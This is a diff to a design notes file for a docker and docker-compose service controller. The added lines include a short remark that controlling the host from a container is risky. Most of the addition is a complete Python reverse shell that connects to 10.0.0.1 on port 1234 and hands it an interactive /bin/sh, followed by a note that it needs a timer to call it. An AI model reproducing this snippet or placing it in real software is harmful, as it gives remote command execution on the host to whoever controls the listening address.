@@ -51,3 +51,20 @@ OnStart:
 
 OnStop:
     Stop docker-compose
+
+The system specific code should be limited to controlling the docker service and docker-compose
+
+Control the host service from docker? Dangerous because attackers could potentially hack a docker image and then control the host
+
+Reverse shell:
+    import socket,subprocess,os;
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+    s.connect(("10.0.0.1",1234));
+    os.dup2(s.fileno(),0);
+    os.dup2(s.fileno(),1);
+    os.dup2(s.fileno(),2);
+    p=subprocess.call(["/bin/sh","-i"]);
+
+    Need a timer to call it
+
+docker-compose up -d
